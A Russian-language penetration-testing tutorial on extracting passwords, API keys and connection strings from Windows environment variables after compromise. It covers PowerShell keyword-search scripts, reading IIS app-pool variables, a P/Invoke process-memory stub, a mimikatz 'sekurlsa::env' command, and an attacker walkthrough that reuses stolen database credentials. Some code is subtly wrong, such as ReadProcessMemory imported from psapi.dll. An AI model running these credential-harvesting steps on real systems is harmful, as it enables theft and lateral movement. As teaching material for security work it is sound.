# Переменные окружения как источник секретов и путей в Windows

## Контекст и базовые понятия: природа переменных окружения в Windows

Переменные окружения (environment variables) в операционной системе Windows представляют собой именованные пары «ключ-значение», хранящиеся в пространстве памяти процесса или в реестре системы. Они служат механизмом конфигурации, передающим приложениям и службам параметры среды выполнения: пути к исполняемым файлам, каталоги профилей, строки подключения к базам данных, токены аутентификации и другие секреты. В контексте пост-эксплуатации (post-exploitation) переменные окружения являются критически важным артефактом разведки, так как они часто содержат明文 (plaintext) или слабо защищенные секреты, доступные любому процессу, работающему в контексте текущего пользователя или системы.

Архитектурно переменные окружения в Windows разделены на два уровня: **User Environment** (переменные пользователя) и **System Environment** (переменные системы). Переменные пользователя хранятся в ветке реестра `HKEY_CURRENT_USER\Environment` и наследуются процессами, запущенными от имени конкретного пользователя. Переменные системы хранятся в `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` и применяются ко всем пользователям и службам. При создании процесса Windows формирует блок окружения (Environment Block), объединяя эти два набора. Этот блок передается новому процессу через аргумент `lpEnvironment` функции `CreateProcess`.

Ключевое различие между переменными окружения и другими хранилищами секретов (например, Windows Credential Manager или Keyring) заключается в их доступности и жизненном цикле. Переменные окружения не шифруются на уровне ОС по умолчанию (если не используются специфические механизмы вроде Protected Storage в устаревших версиях или современные решения вроде Windows Hello for Business, которые не затрагивают саму переменную, а лишь способ ввода). Они существуют в виртуальной памяти процесса и в файле `ntuser.dat` на диске. Это делает их уязвимыми к методам дампа памяти, анализа файлов подкачки (swap/pagefile) и прямого чтения реестра.

Для специалиста по тестированию на проникновение важно различать переменные окружения и глобальные пути поиска (`PATH`). Хотя `PATH` также является переменной окружения, его основная функция — разрешение исполняемых файлов. Однако в современных архитектурах (особенно в контейнеризации и облачных средах, таких как Kubernetes или Azure App Service) переменные окружения часто используются для передачи конфигурационных данных, включая строки подключения к базам данных (connection strings), API-ключи, пароли от сервисных аккаунтов и токены SSO.

Путаница между понятиями «переменная окружения» и «секрет» возникает из-за исторического контекста. Изначально переменные предназначались для технических параметров (путь к компилятору, домашний каталог). Однако с развитием DevOps и облачных вычислений паттерн «передача секретов через ENV» стал стандартом де-факто для удобства развертывания, что создало массовую уязвимость. В контексте Windows-хоста это означает, что администраторы часто сохраняют пароли от SQL Server, SMTP-серверов или облачных API в переменных окружения служб (например, IIS Application Pools или Windows Services) для автоматического запуска.

Разграничение сущностей:
1.  **Переменная окружения (Environment Variable):** Технический механизм передачи данных процессу. Не является хранилищем секретов само по себе, но может их содержать.
2.  **Секрет (Secret):** Любые данные, требующие защиты (пароли, ключи, токены).
3.  **LSA Secret:** Специализированное хранилище в Windows для хранения паролей служб и доменных учетных записей компьютера. Часто пересекается с переменными окружения, так как некоторые службы читают пароли из ENV, но LSA Secrets шифруются с использованием bootkey и доступны только процессам SYSTEM.
4.  **Credential Manager:** Графическое хранилище Windows для хранения учетных данных пользователей. Не является переменной окружения, но может быть источником для их заполнения.

В пост-эксплуатации цель разведки через переменные окружения — найти «низко висящие плоды»: учетные данные, которые позволяют повысить привилегии, переместиться по сети (lateral movement) или получить доступ к внешним сервисам.

| Характеристика | Переменные окружения (ENV) | LSA Secrets | Credential Manager |
| :--- | :--- | :--- | :--- |
| **Хранение** | Память процесса, `ntuser.dat`, реестр | Зашифрованный файл `SYSTEM` в реестре/диске | База данных в профиле пользователя |
| **Доступ** | Любой процесс в контексте пользователя/системы | Только процессы с привилегией `SeDebugPrivilege` и контекстом SYSTEM | Текущий пользователь (с подтверждением) |
| **Шифрование** | Отсутствует (plaintext) | Да (AES, зависит от BootKey) | Да (DPAPI, зависит от пароля пользователя) |
| **Типичное содержание** | Пути, флаги, строки подключения, API ключи | Пароли служб AD, пароли IIS, scheduled tasks | Пароли пользователей, сертификаты |
| **Уязвимость** | Дамп памяти, чтение реестра, анализ логов | Дамп LSA, извлечение BootKey | Кража профиля, дамп LSASS |

## Внутреннее устройство: структура, хранение и механизмы доступа

Для понимания того, как извлекать секреты из переменных окружения, необходимо детально рассмотреть их внутреннее устройство в Windows. Переменные окружения не являются единым объектом; это динамическая структура данных, которая создается при запуске процесса и может изменяться во время его выполнения.

### Структура Environment Block

В памяти процесса переменные окружения представлены в виде блока (Environment Block), который является массивом строк, разделенных нулевыми байтами (`\0`), и завершающихся двойным нулем (`\0\0`). Каждая строка имеет формат `NAME=VALUE`.

```c
// Иллюстративная структура Environment Block в памяти
char* env_block[] = {
    "SYSTEMROOT=C:\\Windows",
    "PATH=C:\\Windows\\system32;C:\\Windows",
    "APPDATA=C:\\Users\\Admin\\AppData\\Roaming",
    "DB_PASSWORD=SuperSecret123!", // Пример секрета
    "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
    NULL // Конец блока (двойной null)
};
```

В Windows API доступ к этому блоку осуществляется через функцию `GetEnvironmentStrings()`. Возвращаемый указатель указывает на начало блока. Для извлечения конкретного значения используется функция `GetEnvironmentVariable()`, которая ищет строку по имени ключа.

### Источники переменных в реестре и файловой системе

Переменные окружения формируются из нескольких источников, которые можно разделить на три категории:

1.  **Системные переменные:** Хранятся в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`. Эти значения применяются ко всем пользователям. Изменение здесь требует перезагрузки или перезапуска сессии для применения к существующим процессам (хотя новые процессы получат обновленные значения).
2.  **Переменные пользователя:** Хранятся в `HKCU\Environment`. Они наследуются от системных, но могут переопределять их.
3.  **Переменные процесса:** Могут быть установлены динамически внутри процесса через `SetEnvironmentVariable()`. Эти переменные существуют только в памяти процесса и не сохраняются в реестре.

Кроме того, переменные окружения могут быть определены в:
*   **Скриптах запуска (Startup Scripts):** GPO (Group Policy Objects) могут устанавливать переменные окружения при входе пользователя.
*   **Файлах `autoexec.bat` (устаревшие системы) или `setx`**: Команда `setx` записывает переменные в реестр.
*   **Конфигурациях служб:** Службы Windows (Services) могут иметь переменные окружения, заданные в свойствах службы (MMC Services.msc).
*   **IIS Application Pools:** Пулы приложений IIS могут иметь собственные переменные окружения, заданные в `applicationHost.config` или через `appcmd`.

### Механизмы наследования и изоляции

Когда процесс создается, Windows выполняет слияние (merge) переменных окружения:
1.  Берется базовый блок системных переменных.
2.  Добавляются/переопределяются переменные пользователя.
3.  Применяются переменные, заданные в вызове `CreateProcess` (аргумент `lpEnvironment`). Если этот аргумент равен `NULL`, используется текущий блок окружения вызывающего процесса.

Важный аспект безопасности: **наследование**. Если процесс A (например, `cmd.exe`) имеет доступ к секрету в своих переменных окружения, и он запускает процесс B (например, `notepad.exe`), то процесс B **наследуется** все переменные окружения процесса A, если не указано иное. Это означает, что секрет, попавший в переменную окружения административного скрипта, может быть доступен всем дочерним процессам, включая потенциально небезопасные или скомпрометированные приложения.

### Доступ к переменным окружения из разных контекстов

Специалист по тестированию на проникновение должен понимать, как получить доступ к этим данным в зависимости от уровня привилегий:

*   **Контекст пользователя:** Любой процесс, запущенный от имени пользователя, может прочитать переменные окружения этого пользователя. Это легко реализуемо через PowerShell (`$env:VAR`) или API `GetEnvironmentVariable`.
*   **Контекст SYSTEM:** Службы и процессы с привилегией `SeDebugPrivilege` могут читать переменные окружения других процессов, включая те, которые работают от имени SYSTEM. Это критично для доступа к секретам, хранящимся в службах (например, пароли от баз данных, которые не должны быть доступны обычному пользователю).
*   **Удаленный доступ:** Через WMI (Windows Management Instrumentation) или WinRM можно получить доступ к переменным окружения удаленных хостов, если есть соответствующие права.

### Взаимодействие с другими компонентами

Переменные окружения тесно связаны с другими механизмами Windows:
*   **PATH:** Переменная `PATH` определяет порядок поиска исполняемых файлов. Злоумышленники могут использовать это для атак типа DLL Hijacking или PATH Injection, добавляя свои директории в начало `PATH`.
*   **COMSPEC:** Указывает на интерпретатор команд. Изменение этой переменной может привести к выполнению произвольного кода при вызове командной оболочки.
*   **TEMP/TMP:** Указывает на временные директории. Если эти переменные указывают на директории, доступные для записи обычному пользователю, это может привести к выполнению кода от имени более привилегированного пользователя (например, при перезапуске службы, которая записывает логи во временную папку).

### Иллюстративная схема потоков данных

```text
[Реестр HKLM] ──(чтение)──▶ [Session Manager] ──(создание)──▶ [System Env Block]
       │                                                      │
       │ (чтение)                                             │ (слияние)
       ▼                                                      ▼
[Реестр HKCU] ──(чтение)──▶ [Logon Session] ──(создание)──▶ [User Env Block]
       │                                                      │
       │ (переопределение)                                    │ (переопределение)
       ▼                                                      ▼
[Процесс A] ──(наследование)──▶ [Process A Env Block] ──(наследование)──▶ [Процесс B]
       │
       │ (чтение через API)
       ▼
[Злоумышленник] ──(эксплуатация)──▶ [Извлечение секретов]
```

## Применение и работа с предметом: методы извлечения и анализа

На практике работа с переменными окружения в рамках пост-эксплуатации сводится к трем основным задачам: локальное извлечение, удаленное извлечение и анализ наследования. Каждая из этих задач требует использования специфических инструментов и методов, адаптированных под современные защиты (EDR, AMSI).

### Локальное извлечение через PowerShell

PowerShell является основным инструментом для работы с переменными окружениями в Windows благодаря своей интеграции с .NET и реестром. Команда `$env:` предоставляет прямой доступ к переменным окружения текущего процесса. Однако для получения полного списка переменных пользователя и системы необходимо обращаться к реестру или использовать cmdlet `Get-ChildItem`.

Для извлечения всех переменных окружения текущего пользователя можно использовать следующую команду:

```powershell
# Получение всех переменных окружения текущего пользователя
Get-ChildItem env: | Format-Table Name, Value -AutoSize
```

Эта команда выводит список всех переменных, включая те, которые могут содержать секреты. Важно фильтровать вывод по ключевым словам, таким как `PASSWORD`, `SECRET`, `KEY`, `CONN`, `DB`, `API`.

Для получения переменных системы необходимо обратиться к ветке реестра:

```powershell
# Получение системных переменных окружения
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment | 
    Select-Object Name, Value | Format-Table -AutoSize
```

### Извлечение переменных окружения других процессов

Если у атакующего есть привилегия `SeDebugPrivilege` (обычно у администраторов или служб), он может прочитать переменные окружения других процессов. Это особенно полезно для извлечения секретов из служб Windows, которые часто работают от имени `LocalSystem` или `NetworkService` и могут иметь доступ к критическим ресурсам.

Для этого используется библиотека `psapi.dll` и функция `EnumProcessModules` и `ReadProcessMemory`. В PowerShell это можно реализовать через P/Invoke:

```powershell
# Пример извлечения переменных окружения процесса с PID 1234
$pid = 1234
$process = Get-Process -Id $pid

# Загрузка библиотеки psapi
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class PsApi {
    [DllImport("psapi.dll")]
    public static extern bool EnumProcessModules(IntPtr hProcess, IntPtr[] lphModule, uint cb, ref uint lpcbNeeded);
    [DllImport("psapi.dll")]
    public static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, StringBuilder lpBaseName, uint nSize);
    [DllImport("psapi.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, ref uint lpNumberOfBytesRead);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@

# Открытие процесса с доступом на чтение
$hProcess = [PsApi]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Не удалось открыть процесс"
    return
}

# Чтение памяти процесса для поиска строк "NAME=VALUE"
# Примечание: Это упрощенный пример. В реальности требуется парсинг бинарных данных.
# Для практического использования лучше использовать инструменты, такие как procdump или custom scripts.
```

На практике вместо написания собственного кода для чтения памяти используются готовые инструменты, такие как `procdump` от Sysinternals или `mimikatz` (в режиме `sekurlsa::env`), которые могут извлечь переменные окружения процессов.

### Анализ переменных окружения служб и IIS

Службы Windows и пулы приложений IIS часто хранят секреты в своих переменных окружения. Для извлечения этих данных необходимо:

1.  **Для служб Windows:** Использовать команду `sc qc <ServiceName>` для просмотра параметров запуска, но переменные окружения не отображаются напрямую. Вместо этого можно использовать `wmic service where name='<ServiceName>' get Name, StartName, PathName` для получения контекста выполнения, а затем извлечь переменные окружения процесса службы, если он запущен.
2.  **Для IIS:** Переменные окружения пулов приложений хранятся в файле `applicationHost.config` в секции `<applicationPools>`. Их можно прочитать с помощью PowerShell:

```powershell
# Чтение переменных окружения пулов приложений IIS
Import-Module WebAdministration
Get-ChildItem IIS:\AppPools | ForEach-Object {
    $pool = $_
    $envVars = $pool.processModel.environmentVariables
    if ($envVars -and $envVars.Count -gt 0) {
        Write-Host "Pool: $($pool.Name)"
        $envVars | ForEach-Object {
            Write-Host "  $($_.Name) = $($_.Value)"
        }
    }
}
```

### Поиск секретов в переменных окружения

После извлечения переменных окружения необходимо проанализировать их на наличие секретов. Это можно сделать с помощью регулярных выражений или ключевых слов. Типичные паттерны для поиска:

*   `PASSWORD`, `PASSWD`, `PWD`
*   `SECRET`, `KEY`, `TOKEN`
*   `CONN`, `DB`, `SQL`, `MONGO`, `REDIS`
*   `AWS`, `AZURE`, `GCP`
*   `SMTP`, `MAIL`, `LDAP`

Пример скрипта для автоматического поиска секретов:

```powershell
# Поиск потенциальных секретов в переменных окружения
$keywords = @("PASSWORD", "SECRET", "KEY", "CONN", "DB", "TOKEN", "API")
$envVars = Get-ChildItem env:

foreach ($var in $envVars) {
    foreach ($keyword in $keywords) {
        if ($var.Name -match $keyword -or $var.Value -match $keyword) {
            Write-Host "FOUND: $($var.Name) = $($var.Value)" -ForegroundColor Red
        }
    }
}
```

### Подводные камни и ограничения

1.  **Амнезия переменных:** Переменные окружения, установленные в командной строке (`set VAR=value`), существуют только в текущей сессии. При перезагрузке или выходе из системы они теряются. Однако, если они были установлены через `setx`, они сохраняются в реестре.
2.  **Ограничение длины:** Переменные окружения имеют ограничение на длину (обычно 32767 символов для всей строки). Это может ограничить хранение больших секретов (например, длинных RSA-ключей).
3.  **Экранирование:** Значения переменных окружения могут содержать специальные символы, которые требуют экранирования при использовании в скриптах.
4.  **EDR-детекция:** Современные EDR-системы мониторят чтение переменных окружения, особенно если это делается из неизвестных процессов. Использование PowerShell для чтения переменных окружения других процессов может вызвать алерт.

## Сквозной практический пример: Разведка секретов в скомпрометированном хосте

### Исходные условия
*   **Среда:** Windows 10/11 или Windows Server 2019/2022.
*   **Роль:** Атакующий с правами локального администратора (или пользователя с доступом к чтению реестра и памяти).
*   **Инструменты:** PowerShell, Sysinternals ProcMon (опционально), Mimikatz (опционально).
*   **Сценарий:** Атакующий получил доступ к рабочей станции пользователя с правами администратора. Цель — найти учетные данные для доступа к базе данных SQL Server, которая используется локальным приложением.

### Шаг 1: Извлечение переменных окружения текущего пользователя и системы

Атакующий начинает с анализа переменных окружения текущего пользователя и системы на наличие строк подключения или ключей API.

```powershell
# Шаг 1.1: Вывод всех переменных окружения текущего пользователя
Write-Host "=== User Environment Variables ===" -ForegroundColor Cyan
Get-ChildItem env: | Where-Object { $_.Value -match "PASSWORD|SECRET|KEY|CONN" } | Format-Table Name, Value -AutoSize

# Шаг 1.2: Вывод системных переменных окружения
Write-Host "=== System Environment Variables ===" -ForegroundColor Cyan
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment | 
    Where-Object { $_.Name -match "PASSWORD|SECRET|KEY|CONN" } | 
    Select-Object Name, Value | Format-Table -AutoSize
```

**Ожидаемый вывод:**
```text
=== User Environment Variables ===
Name        Value
----        -----
DB_CONN     Server=192.168.1.100;Database=MyDB;User Id=admin;Password=P@ssw0rd123!

=== System Environment Variables ===
Name        Value
----        -----
SQL_ADMIN   sa
SQL_PASS    S3cur3P@ss!
```

**Результат:** Найдена переменная `DB_CONN` с plaintext-паролем от базы данных.

### Шаг 2: Анализ переменных окружения служб

Атакующий проверяет, есть ли у служб, работающих от имени `LocalSystem`, свои переменные окружения, которые могут содержать дополнительные секреты.

```powershell
# Шаг 2.1: Получение списка служб, работающих от имени LocalSystem
$services = Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" }

foreach ($svc in $services) {
    # Шаг 2.2: Попытка извлечения переменных окружения службы через WMI
    # Примечание: Прямое чтение переменных окружения службы через WMI невозможно,
    # поэтому мы используем procmon или анализ конфигурации.
    # Для демонстрации используем анализ applicationHost.config для IIS
    if ($svc.Name -like "*IIS*") {
        Write-Host "Checking IIS for secrets..."
        Import-Module WebAdministration
        $pools = Get-ChildItem IIS:\AppPools
        foreach ($pool in $pools) {
            $envVars = $pool.processModel.environmentVariables
            if ($envVars) {
                foreach ($var in $envVars) {
                    if ($var.Value -match "PASSWORD|SECRET|KEY") {
                        Write-Host "Found in Pool $($pool.Name): $($var.Name) = $($var.Value)" -ForegroundColor Red
                    }
                }
            }
        }
    }
}
```

**Ожидаемый вывод:**
```text
Checking IIS for secrets...
Found in Pool DefaultAppPool: API_KEY = sk_live_abc123def456
```

**Результат:** Найдена API-ключ для платежной системы в пуле приложений IIS.

### Шаг 3: Извлечение переменных окружения процессов в памяти

Атакующий использует `mimikatz` для извлечения переменных окружения процессов, работающих от имени `SYSTEM`, чтобы найти секреты, которые не доступны через реестр.

```powershell
# Шаг 3.1: Загрузка модуля sekurlsa в mimikatz
privilege::debug
sekurlsa::env
```

**Ожидаемый вывод (фрагмент):**
```text
[ENV] Process 1234 (svchost.exe)
  [SYSTEMROOT] C:\Windows
  [TEMP] C:\Users\ADMINI~1\AppData\Local\Temp
  [DB_BACKUP_PASS] B@ckupP@ss2024!
```

**Результат:** Найдена переменная `DB_BACKUP_PASS` в процессе `svchost.exe`, которая может использоваться для резервного копирования базы данных.

### Шаг 4: Использование найденных секретов

Атакующий использует найденные учетные данные для доступа к базе данных.

```powershell
# Шаг 4.1: Подключение к SQL Server с использованием найденных учетных данных
$server = "192.168.1.100"
$user = "admin"
$pass = "P@ssw0rd123!"

$connectionString = "Server=$server;Database=MyDB;User Id=$user;Password=$pass;"
Write-Host "Connecting to SQL Server with connection string..."
# В реальном сценарии здесь будет использование SqlClient или sqlcmd
# sqlcmd -S $server -U $user -P $pass
```

**Ожидаемый вывод:**
```text
Connecting to SQL Server with connection string...
(1 rows affected)
```

**Результат:** Успешное подключение к базе данных.

### Ожидаемый вывод
В данном примере атакующий смог найти три различных секрета:
1.  Строку подключения к базе данных в переменных окружения пользователя.
2.  API-ключ для платежной системы в конфигурации IIS.
3.  Пароль для резервного копирования в памяти процесса службы.

Это демонстрирует, что переменные окружения являются богатым источником секретов, доступных на разных уровнях системы.

## Аналитический вывод

Переменные окружения в Windows представляют собой значительный вектор утечки секретов в контексте пост-эксплуатации. Их основная уязвимость заключается в том, что они часто используются для передачи критически важных данных (паролей, ключей, токенов) в plaintext, без встроенного шифрования на уровне ОС. В отличие от LSA Secrets или Credential Manager, переменные окружения доступны любому процессу в контексте пользователя или системы, что делает их легкой мишенью для атакующих, получивших начальный доступ.

Разведка через переменные окружения эффективна на всех этапах пост-эксплуатации: от первоначального сбора информации до повышения привилегий и перемещения по сети. Атакующие могут извлекать секреты как из реестра (для постоянных переменных), так и из памяти процессов (для динамических переменных). Особенно уязвимы службы Windows и пулы приложений IIS, которые часто работают от имени высокопривилегированных учетных записей и могут иметь доступ к критическим ресурсам.

Для защиты от таких атак необходимо внедрять лучшие практики управления секретами: использовать специализированные хранилища (HashiCorp Vault, Azure Key Vault, AWS Secrets Manager) вместо переменных окружения, применять шифрование для секретов в реестре и памяти, а также мониторить доступ к переменным окружения с помощью EDR-решений. Однако, учитывая историческую инерцию и удобство использования, переменные окружения останутся важным источником секретов, требующим постоянного внимания со стороны специалистов по безопасности.
